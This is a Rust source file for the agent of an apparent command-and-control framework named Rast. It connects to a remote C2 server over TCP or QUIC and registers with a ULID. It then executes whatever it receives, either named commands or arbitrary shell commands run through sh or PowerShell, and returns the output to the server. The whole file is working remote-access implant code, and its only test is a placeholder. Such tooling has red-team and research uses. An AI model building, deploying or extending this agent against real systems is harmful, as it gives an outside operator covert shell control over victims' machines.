//! The agent part of the Rast project.

use std::sync::{Arc, RwLock};

use anyhow::{bail, Result};
use commands::Commands;
use futures_util::sink::SinkExt;
use rast::{
    encoding::{Encoding, JsonPackager, Packager},
    messages::{AgentInit, Message, MessageZone},
    protocols::{quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
    settings::{Connection, Settings},
    RastError,
};
use tokio::{process::Command as SystemCommand, sync::Mutex};
use tracing::{debug, info, trace};
use ulid::Ulid;

use crate::{
    commands::{Command, CommandOutput},
    context::Context,
    messages::{AgentResponse, C2Request},
};

pub mod commands;
pub mod context;
pub mod messages;

pub struct RastAgent {
    ulid: Ulid,
    settings: Settings,
    context: Arc<RwLock<Context>>,
    connection: Arc<Mutex<dyn ProtoConnection>>,
    commands: Commands,
}

impl RastAgent {
    /// Creates new instance using provided [Settings].
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let connection = RastAgent::get_connection(&settings).await?;

        Ok(RastAgent {
            ulid: Ulid::new(),
            settings,
            connection,
            commands: Commands::new(),
            context: Arc::new(RwLock::new(Context::new())),
        })
    }

    async fn get_connection(settings: &Settings) -> Result<Arc<Mutex<dyn ProtoConnection>>> {
        for conf in settings.agent.connections.iter() {
            let conn = match conf {
                Connection::Tcp(tcp_conf) => TcpFactory::new_connection(tcp_conf).await,
                Connection::Quic(quic_conf) => QuicFactory::new_connection(quic_conf).await,
                _ => bail!(RastError::Unknown),
            };

            if let Ok(conn) = conn {
                info!("Connected to C2 at: {:?}", conn.lock().await.remote_addr()?);
                return Ok(conn);
            };
        }

        Err(RastError::Unknown.into())
    }

    /// Starts execution.
    pub async fn run(&mut self) {
        info!("RastAgent running");

        let mut conn = self.connection.lock().await;
        let mut messager = Messager::with_packager(&mut *conn, JsonPackager);

        let init = AgentInit { ulid: self.ulid };
        let init = JsonPackager::encode(&init).unwrap();
        let init = Message::new(
            MessageZone::External(self.ulid),
            Encoding::Json,
            init.into(),
        );
        if let Err(e) = messager.send(&init).await {
            debug!("Failed to send init message: {:?}", e);
        };

        loop {
            if let Ok(msg) = messager.receive().await {
                if !self.validate_message(&msg) {
                    debug!("Invalid message received: {:?}", msg);
                    continue;
                }

                if let Ok(c2req) = JsonPackager::decode(&msg.data) {
                    match self.handle_message(c2req).await {
                        Ok(response) => {
                            let encoded = JsonPackager::encode(&response).unwrap();
                            let response = msg.respond(encoded.into());
                            if let Err(e) = messager.send(&response).await {
                                debug!("Failed to send response: {:?}", e);
                            };
                        },
                        Err(e) => {
                            debug!("Failed to handle message: {:?}", e);
                        },
                    }
                }
            }
        }
    }

    fn validate_message(&self, msg: &Message) -> bool {
        match msg.zone {
            MessageZone::Internal => false,
            MessageZone::External(ulid) => ulid == self.ulid,
        }
    }

    async fn handle_message(&self, msg: C2Request) -> Result<AgentResponse, RastError> {
        let response = match msg {
            C2Request::ExecCommand(cmd, args) => {
                if let Some(cmd) = self.commands.get_command(cmd) {
                    let output = cmd.execute(self.context.clone(), args).await?;
                    let output = match output {
                        CommandOutput::Nothing => "".to_string(),
                        CommandOutput::Text(txt) => txt,
                        CommandOutput::ListOfText(txts) => txts.join("\n"),
                    };
                    AgentResponse::CommandOutput(output)
                } else {
                    AgentResponse::Error("Command not found".to_string())
                }
            },
            C2Request::ExecShell(cmd) => {
                let dir = self.context.read().unwrap().get_dir();
                let shell = if cfg!(target_os = "windows") {
                    "powershell.exe"
                } else {
                    "sh"
                };

                let output = SystemCommand::new(shell)
                    .current_dir(dir)
                    .arg("-c")
                    .arg(cmd)
                    .output()
                    .await;

                trace!("Response {:?}", output);
                let response = match output {
                    Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                    Err(e) => e.to_string(),
                };

                AgentResponse::ShellResponse(response)
            },
            C2Request::GetCommands => {
                AgentResponse::Commands(self.commands.get_supported_commands())
            },
            C2Request::GetUlid => AgentResponse::Ulid(self.ulid),
        };

        Ok(response)
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
